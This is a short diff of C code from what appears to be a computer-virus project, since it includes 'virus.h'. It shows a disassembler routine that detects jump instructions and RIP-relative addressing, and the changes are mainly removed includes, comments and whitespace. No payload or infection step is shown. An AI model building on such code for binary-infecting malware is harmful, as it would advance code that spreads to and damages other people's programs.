@@ -1,13 +1,9 @@
-
 #include "virus.h"
 #include "disasm.h"
 #include "disasm_utils.h"
 #include "utils.h"
-#include "bytes.h"
 #include "compiler_utils.h"
 #include "errors.h"
-
-// TODO secure disasm length for unknown instructions
 
 /* -------------------------- change header entry --------------------------- */
 
@@ -56,7 +52,7 @@ static bool	disasm_jump(const void *code, size_t codelen)
 {
 	uint8_t		*p = (uint8_t*)code;
 	uint8_t		opcode;                 /* current opcode       */
-	int8_t		prefix = 0;           /* opcode prefix(es)    */
+	int8_t		prefix = 0;             /* opcode prefix(es)    */
 
 	if (codelen > INSTRUCTION_MAXLEN) codelen = INSTRUCTION_MAXLEN;
 
@@ -94,7 +90,6 @@ next_opcode:
 		uint8_t	mod = (opcode & 0b11000000) >> 6;
 		uint8_t	rm  = opcode & 0b00000111;
 
-		// 48 8d 35 42 00 00 00
 		if (mod == 0b00 && rm == 0b101)  /* RIP-relative addressing */
 		{
 			goto is_jump;
